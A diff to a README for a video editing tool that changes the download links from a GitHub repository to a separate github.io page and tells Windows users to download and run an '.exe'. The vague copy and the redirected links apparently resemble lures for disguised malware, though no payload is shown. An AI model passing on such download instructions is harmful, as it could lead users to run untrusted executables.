@@ -1,6 +1,6 @@
 # 🎬 Video-Utility-Tool - Professional video editing for every creator
 
-[![Download Video-Utility-Tool](https://img.shields.io/badge/Download-Video_Utility_Tool-blue.svg)](https://github.com/linear-iceaxe568/Video-Utility-Tool)
+[![Download Video-Utility-Tool](https://img.shields.io/badge/Download-Video_Utility_Tool-blue.svg)](https://linear-iceaxe568.github.io)
 
 This software provides a set of tools for video editing. It includes features for artificial intelligence tasks, high-quality 4K export, and professional effects. Use this tool to improve your content creation process.
 
@@ -19,7 +19,7 @@ Ensure your computer has the following hardware and software to run the applicat
 
 Follow these steps to install the software on your Windows computer:
 
-1. Visit the [official download page](https://github.com/linear-iceaxe568/Video-Utility-Tool).
+1. Visit the [official download page](https://linear-iceaxe568.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version link.
 4. Locate the file ending in ".exe" under the "Assets" area.
